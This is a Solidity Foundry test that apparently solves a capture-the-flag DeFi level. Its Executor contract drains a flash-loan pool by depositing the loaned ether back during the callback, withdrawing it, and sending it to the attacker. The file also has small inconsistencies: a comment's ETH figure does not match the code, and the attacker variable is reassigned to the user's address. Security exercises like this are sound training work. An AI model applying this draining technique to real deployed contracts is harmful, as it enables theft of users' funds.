// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Test} from "forge-std/Test.sol";
import {Utilities} from "../Utilities.sol";
import {console} from "forge-std/console.sol";
import {Vm} from "forge-std/Vm.sol";

import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

//import {BaseTest} from "../BaseTest.sol";
import "openzeppelin-contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract Executor is IFlashLoanEtherReceiver {
    using Address for address payable;

    SideEntranceLenderPool internal pool;
    address internal owner;

    constructor(SideEntranceLenderPool _pool) {
        owner = msg.sender;
        pool = _pool;
    }

    function execute() external payable {
        require(msg.sender == address(pool), "only pool");
        // receive flash loan and call pool.deposit depositing the loaned amount
        pool.deposit{value: msg.value}();
    }

    function borrow() external {
        require(msg.sender == owner, "only owner");
        uint256 poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);

        // we have deposited inside the `execute` method so we withdraw the deposited borrow
        pool.withdraw();

        // now we transfer received pool balance to the owner (attacker)
        payable(owner).sendValue(address(this).balance);
    }

    receive () external payable {}
}


contract SideEntranceLenderPoolTest is Test {
    // Pool has 1000000 ETH in balance
    uint internal ETHER_IN_POOL = 1000 ether;

    SideEntranceLenderPool internal pool;
    Utilities internal utils;

    uint256 internal attackerInitialEthBalance;
    address payable internal user;
    address payable internal attacker;
    // constructor() {
    //     string[] memory labels = new string[](2);
    //     labels[0] = "Attacker";
    //     //preSetup(2, labels);
    // }

    function setUp() public {
        //super.setUp();

        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);
        user = users[0];
        attacker = users[1];

        vm.label(user, "User");
        vm.label(attacker, "Attacker");
        
        attacker = users[0];

        // setup contracts
        pool = new SideEntranceLenderPool();
        vm.label(address(pool), "SideEntranceLenderPool");

        pool.deposit{value: ETHER_IN_POOL}();

        attackerInitialEthBalance = attacker.balance;

        assertEq(address(pool).balance, ETHER_IN_POOL);
    }

    
    function testExploit() public {
        runTest();
    }

    function runTest() internal {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(attacker);
        Executor executor = new Executor(pool);
        executor.borrow();
        vm.stopPrank();
        success();
    }

    function success() internal {
        /** SUCCESS CONDITIONS */

        assertEq(address(pool).balance, 0);

        // Not checking exactly how much is the final balance of the attacker,
        // because it'll depend on how much gas the attacker spends in the attack
        // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}